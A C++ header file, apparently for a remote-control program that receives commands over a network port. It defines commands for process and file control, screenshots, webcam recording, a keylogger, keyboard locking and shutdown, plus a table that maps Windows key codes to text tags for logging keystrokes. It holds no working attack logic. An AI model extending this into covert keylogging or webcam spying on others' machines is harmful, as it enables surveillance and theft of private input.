#pragma once

#include <iostream>
#include <map>
#include <string>

constexpr auto DEFAULT_PORT = "12345";
constexpr auto DEFAULT_BUFLEN = 1024;

const std::string SCREENSHOT_PATH = "screenshot.png";
const std::string KEYLOGGER_PATH = "dat.txt";
const std::string WEBCAM_PATH = "output.mp4";

enum COMMANDS {
	INVALID,
	LIST_PROCESS,
	START_PROCESS,
	STOP_PROCESS,
	SHUTDOWN,
	RESTART,
	LIST_FILES,
	DELETE_FILE,
	MOVE_FILE,
	COPY_FILE,
	CAPTURE_SCREENSHOT,
	START_WEBCAM,
	STOP_WEBCAM,
	LIST_APPS,
	START_APP,
	STOP_APP,
	START_KEYLOGGER,
	STOP_KEYLOGGER,
	LOCK_KEYBOARD,
	UNLOCK_KEYBOARD
};

const std::map<std::string, COMMANDS> commandMap = {
	// 1
	{"list", LIST_PROCESS},
	{"start", START_PROCESS},
	{"stop", STOP_PROCESS},
	{"screenshot", CAPTURE_SCREENSHOT},

	{"ls", LIST_FILES},
	{"delete", DELETE_FILE},
	{"move", MOVE_FILE},
	{"copy", COPY_FILE},
	{"start_webcam", START_WEBCAM},
	{"stop_webcam", STOP_WEBCAM},
	{"start_keylogger", START_KEYLOGGER},
	{"stop_keylogger", STOP_KEYLOGGER},

	{"list_app", LIST_APPS},
	{"start_app", START_APP},
	{"stop_app", STOP_APP},
	{"lock_keyboard", LOCK_KEYBOARD},
	{"unlock_keyboard", UNLOCK_KEYBOARD},
	{"shutdown", SHUTDOWN},
	{"restart", RESTART},
};

const std::map<std::string, std::string> filePaths = {
	{"screenshot", SCREENSHOT_PATH},
	{"stop_keylogger", KEYLOGGER_PATH},
	{"stop_webcam", WEBCAM_PATH}
};

const std::map<int, std::string> specialKeys = {
	{VK_SPACE, "#SPACE"},
	{VK_RETURN, "#RETURN"},
	{VK_BACK, "#BACKSPACE"},
	{VK_LBUTTON, "#L_CLICK"},
	{VK_RBUTTON, "#R_CLICK"},
	{VK_CAPITAL, "#CAPS_LOCK"},
	{VK_TAB, "#TAB"},
	{VK_UP, "#UP_ARROW_KEY"},
	{VK_DOWN, "#DOWN_ARROW_KEY"},
	{VK_LEFT, "#LEFT_ARROW_KEY"},
	{VK_RIGHT, "#RIGHT_ARROW_KEY"},
	{VK_CONTROL, "#CONTROL"},
	{VK_MENU, "#ALT"},
	{VK_ESCAPE, "#ESCAPE"},
	{VK_END, "#END"},
	{VK_HOME, "#HOME"},
	{VK_INSERT, "#INSERT"},
	{VK_DELETE, "#DELETE"},
	{VK_SHIFT, "#SHIFT"},
	{VK_LSHIFT, "#LEFT_SHIFT"},
	{VK_RSHIFT, "#RIGHT_SHIFT"},
	{VK_LCONTROL, "#LEFT_CONTROL"},
	{VK_RCONTROL, "#RIGHT_CONTROL"},
	{VK_LMENU, "#LEFT_ALT"},
	{VK_RMENU, "#RIGHT_ALT"},
	{VK_LWIN, "#LEFT_WINDOWS"},
	{VK_RWIN, "#RIGHT_WINDOWS"},
	{VK_SNAPSHOT, "#PRINT_SCREEN"},
	{VK_SCROLL, "#SCROLL_LOCK"},
	{VK_PAUSE, "#PAUSE"},
	{VK_F1, "#F1"},
	{VK_F2, "#F2"},
	{VK_F3, "#F3"},
	{VK_F4, "#F4"},
	{VK_F5, "#F5"},
	{VK_F6, "#F6"},
	{VK_F7, "#F7"},
	{VK_F8, "#F8"},
	{VK_F9, "#F9"},
	{VK_F10, "#F10"},
	{VK_F11, "#F11"},
	{VK_F12, "#F12"},
	{VK_NUMLOCK, "#NUM_LOCK"},
	{VK_MULTIPLY, "#NUMPAD_MULTIPLY"},
	{VK_ADD, "#NUMPAD_ADD"},
	{VK_SUBTRACT, "#NUMPAD_SUBTRACT"},
	{VK_DECIMAL, "#NUMPAD_DECIMAL"},
	{VK_DIVIDE, "#NUMPAD_DIVIDE"},
	{VK_NUMPAD0, "#NUMPAD_0"},
	{VK_NUMPAD1, "#NUMPAD_1"},
	{VK_NUMPAD2, "#NUMPAD_2"},
	{VK_NUMPAD3, "#NUMPAD_3"},
	{VK_NUMPAD4, "#NUMPAD_4"},
	{VK_NUMPAD5, "#NUMPAD_5"},
	{VK_NUMPAD6, "#NUMPAD_6"},
	{VK_NUMPAD7, "#NUMPAD_7"},
	{VK_NUMPAD8, "#NUMPAD_8"},
	{VK_NUMPAD9, "#NUMPAD_9"},
	{VK_OEM_1, "#SEMICOLON"},
	{VK_OEM_2, "#FORWARD_SLASH"},
	{VK_OEM_3, "#GRAVE_ACCENT"},
	{VK_OEM_4, "#LEFT_BRACKET"},
	{VK_OEM_5, "#BACKSLASH"},
	{VK_OEM_6, "#RIGHT_BRACKET"},
	{VK_OEM_7, "#SINGLE_QUOTE"},
	{VK_OEM_COMMA, "#COMMA"},
	{VK_OEM_MINUS, "#MINUS"},
	{VK_OEM_PERIOD, "#PERIOD"},
	{VK_OEM_PLUS, "#PLUS"},
	{VK_OEM_102, "#ANGLE_BRACKET"},
	{VK_OEM_CLEAR, "#CLEAR"},
	{VK_OEM_COPY, "#COPY"},
	{VK_OEM_ENLW, "#ENLW"},
};